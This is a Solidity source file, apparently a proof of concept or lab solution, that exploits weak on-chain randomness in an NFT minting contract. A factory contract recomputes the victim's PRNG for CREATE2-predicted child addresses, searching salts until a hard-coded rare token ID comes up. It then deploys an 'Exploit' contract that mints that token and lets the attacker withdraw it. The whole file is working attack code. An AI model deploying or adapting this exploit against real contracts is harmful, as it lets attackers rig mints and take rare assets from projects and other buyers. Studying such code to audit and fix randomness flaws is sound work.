// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";

// https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2

interface IVictim {
    function mintRandom(uint256 numTokens) external payable;

    function tokenIds(uint256 index) external view returns (uint256);

    function maxSupply() external view returns (uint256);

    function count() external view returns (uint256);
}

contract Exploit {
    address immutable beneficiary;
    address immutable targetContract;

    event Target(address target, uint256 remaining);

    constructor(
        address _evilGenius,
        address _target,
        uint256 mintPrice,
        uint256 qty
    ) payable {
        beneficiary = _evilGenius;
        targetContract = _target;
        IVictim(_target).mintRandom{value: mintPrice * qty}(qty);
    }

    function withdrawExploitedNft(uint256 tokenId) external {
        require(msg.sender == beneficiary, "Only the exploiter can withdraw");
        IERC721(targetContract).transferFrom(
            address(this),
            msg.sender,
            tokenId
        );
    }
}

contract PrngAttackerFactory {
    bytes32 private callerHash;
    bytes private callerBytecode;
    address private immutable owner;
    address private immutable targetAddress;

    uint256 private constant targetMintPrice = 0.1 ether;

    uint256[10] rareTokenIds = [9, 22, 53, 129, 222, 346, 469, 750, 812, 945];

    // address[] public deployedExploits;
    address public deployedExploit;

    event AddressPrediction(address indexed predicted);
    event DeployedExploit(address destination, bytes32 salt);
    event RareTokenFound(
        address exploitAddress,
        uint256 desiredId,
        uint256 salt
    );

    constructor(address victimContract) payable {
        owner = msg.sender;
        targetAddress = victimContract;
    }

    function exploitVictim(uint256 iterations) external {
        require(msg.sender == owner, "!owner");

        for (uint256 i; i < iterations; i++) {
            bytes32 saltyBytes = keccak256(abi.encodePacked(i));

            (
                uint256 computedTokenId,
                address exploitAddress
            ) = _emulateVictimPrng(saltyBytes);

            // only mint the token if it's one of the identified rares
            if (_checkRarity(computedTokenId)) {
                emit AddressPrediction(exploitAddress);

                address jackpotAddress = deployExploitContract(
                    targetMintPrice,
                    saltyBytes
                );
                require(
                    jackpotAddress == exploitAddress,
                    "Deployed address does not match prediction"
                );

                // expose for visibility in testing
                deployedExploit = jackpotAddress;

                emit RareTokenFound(jackpotAddress, computedTokenId, i);
                break;
            }
        }
    }

    function deployExploitContract(uint256 amountToSend, bytes32 _salt)
        public
        payable
        returns (address exploitAddress)
    {
        exploitAddress = address(
            new Exploit{salt: _salt, value: 0.1 ether}(
                owner,
                targetAddress,
                amountToSend,
                1
            )
        );

        emit DeployedExploit(exploitAddress, _salt);
    }

    /**
        @dev    Checks an ID against against known rare token IDs
     */
    function _checkRarity(uint256 id) internal view returns (bool) {
        for (uint256 i; i < rareTokenIds.length; i++) {
            if (rareTokenIds[i] == id) return true;
        }
        return false;
    }

    function _predictDeployedContractAddress(bytes32 _salt)
        private
        returns (address predicted)
    {
        /*
            We need to combine the creation code with the arguments passed to the
            exploit contract's constructor to create the bytecode.
            ie. bytecode = creation code + constructor args
         */
        bytes memory callerBytecode = abi.encodePacked(
            type(Exploit).creationCode,
            abi.encode(
                owner, // eventual recipient of NFT, ie. the factory's deployer
                targetAddress, // victim contract address
                targetMintPrice, // price per token
                1 // number to mint
            )
        );

        bytes32 callerHash = keccak256(callerBytecode);
        bytes32 addressHash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, callerHash)
        );

        // cast the last 20 bytes of the hash to an address
        predicted = address(uint160(uint256(addressHash)));
    }

    function _emulateVictimPrng(bytes32 salt)
        private
        returns (uint256 id, address predictedAddress)
    {
        // derive the contract address
        predictedAddress = _predictDeployedContractAddress(salt);

        /*
            Emulate the PRNG by using the same values to compute the entropy.
            We substitute the following:
            msg.sender => predictedAddress
            and
            address(this) => targetAddress
        */
        uint256 victimEntropy = uint256(
            keccak256(
                abi.encode(
                    predictedAddress,
                    targetAddress,
                    blockhash(block.number - 1),
                    block.basefee,
                    block.timestamp
                )
            )
        );

        /*
            The victim contract uses the number of tokens minted, as well as the length
            of the index array to determine what index to choose, so we need to fetch both
            values using the IVictim interface.
        */
        IVictim victim = IVictim(targetAddress);
        uint256 mintedTokenCount = victim.count();
        uint256 remaining = victim.maxSupply() - mintedTokenCount++;

        uint256 randomIndex = victimEntropy % remaining;

        id = victim.tokenIds(randomIndex) != 0
            ? victim.tokenIds(randomIndex)
            : randomIndex;
    }

    receive() external payable {}

    fallback() external payable {}
}
